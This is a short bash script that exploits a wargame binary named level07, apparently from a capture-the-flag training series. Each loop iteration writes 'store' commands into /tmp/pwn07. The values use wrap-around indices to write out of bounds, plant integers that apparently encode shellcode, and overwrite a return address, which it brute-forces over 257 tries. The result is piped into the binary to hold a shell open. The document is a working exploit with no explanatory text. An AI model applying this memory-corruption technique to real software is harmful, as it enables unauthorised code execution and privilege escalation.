#!/bin/bash

for i in $(seq 0 256)
do
    rm -f /tmp/pwn07
    touch /tmp/pwn07
    chmod 777 /tmp/pwn07
    
    echo "store" >> /tmp/pwn07
    echo "834679184" >> /tmp/pwn07
    echo "1073741824" >> /tmp/pwn07
    
    echo "store" >> /tmp/pwn07
    echo "835858889" >> /tmp/pwn07
    echo "1" >> /tmp/pwn07
    
    echo "store" >> /tmp/pwn07
    echo "1391866367" >> /tmp/pwn07
    echo "2" >> /tmp/pwn07
    
    echo "store" >> /tmp/pwn07
    echo "1932472168" >> /tmp/pwn07
    echo "1073741827" >> /tmp/pwn07
    
    echo "store" >> /tmp/pwn07
    echo "1647274088" >> /tmp/pwn07
    echo "4" >> /tmp/pwn07
    
    echo "store" >> /tmp/pwn07
    echo "3817434729" >> /tmp/pwn07
    echo "5" >> /tmp/pwn07
    
    echo "store" >> /tmp/pwn07
    echo "2160921520" >> /tmp/pwn07
    echo "1073741830" >> /tmp/pwn07
    
    echo "store" >> /tmp/pwn07
    echo "$((4294956372 + $i))" >> /tmp/pwn07
    echo "1073741938" >> /tmp/pwn07

	echo "quit" >> /tmp/pwn07

	(cat /tmp/pwn07; cat) | /home/users/level07/level07

done